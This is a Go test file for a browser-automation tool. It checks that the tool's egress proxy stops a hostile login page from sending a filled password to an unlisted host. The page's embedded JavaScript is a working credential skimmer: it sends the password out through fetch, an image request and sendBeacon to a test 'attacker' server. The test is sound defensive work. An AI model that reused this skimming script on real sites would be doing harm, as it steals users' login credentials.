//go:build linux || darwin

package browser

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

// TestEgressExfilBlocked (real browser, attack 6): after conductor fills a
// password, hostile script on the credential's origin tries to beacon it out —
// fetch, an image, and sendBeacon — to a host that is NOT on the allowlist. The
// browser has no network of its own; its only way out is conductor's egress
// proxy, narrowed (for the logged-in browser) to the credential's hosts. The
// beacon must die at the proxy: the attacker's host receives nothing, and the
// value is not in any reply or audit entry (the egress audit drops the query).
func TestEgressExfilBlocked(t *testing.T) {
	const pw = "SENTINEL-PW-9f3a1b2c"

	// The attacker's collector — deliberately NOT added to the allowlist.
	var mu sync.Mutex
	var hits []string
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		hits = append(hits, r.URL.String())
		mu.Unlock()
		w.WriteHeader(204)
	}))
	t.Cleanup(evil.Close)
	evilHost := strings.TrimPrefix(evil.URL, "http://")

	// The credential origin, with hostile beacon script firing the moment the
	// password is typed.
	page := fmt.Sprintf(`<!doctype html><html><title>Sign in</title><body><h1>Sign in</h1>
<form method="post" action="/login">
<label>Username <input name="username" autocomplete="username"></label>
<label>Password <input name="password" type="password" autocomplete="current-password"></label>
<button type="submit">Sign in</button></form>
<script>
var pw=document.querySelector('input[name=password]');
pw.addEventListener('input', function(){
  var v=pw.value; if(!v) return;
  var u='http://%s/leak?v='+encodeURIComponent(v);
  try{ fetch(u, {mode:'no-cors'}); }catch(e){}
  try{ new Image().src=u+'&img=1'; }catch(e){}
  try{ navigator.sendBeacon(u+'&b=1'); }catch(e){}
});
</script></body></html>`, evilHost)

	r, c, url := credServerRig(t, pw, page)
	r.do(c, "open", map[string]any{"url": url + "/login"})
	s := r.do(c, "snapshot", nil)["snapshot"].(string)
	ref := refOf(t, s, "textbox", "Password")
	r.do(c, "fill-credential", map[string]any{"credential": "site", "field": "password", "ref": ref})

	// Give the beacons time to be attempted (and die at the proxy).
	time.Sleep(1500 * time.Millisecond)

	mu.Lock()
	got := append([]string(nil), hits...)
	mu.Unlock()
	if len(got) != 0 {
		t.Fatalf("LEAK: the attacker's unlisted host received %d beacon(s): %v", len(got), got)
	}

	// The value must not be in any audit entry (the egress refusal drops the
	// query via redactURL).
	r.audit.mu.Lock()
	defer r.audit.mu.Unlock()
	for _, e := range r.audit.es {
		b := fmt.Sprint(e)
		if strings.Contains(b, pw) {
			t.Fatalf("LEAK: a filled value reached the audit: %.300s", b)
		}
	}
}
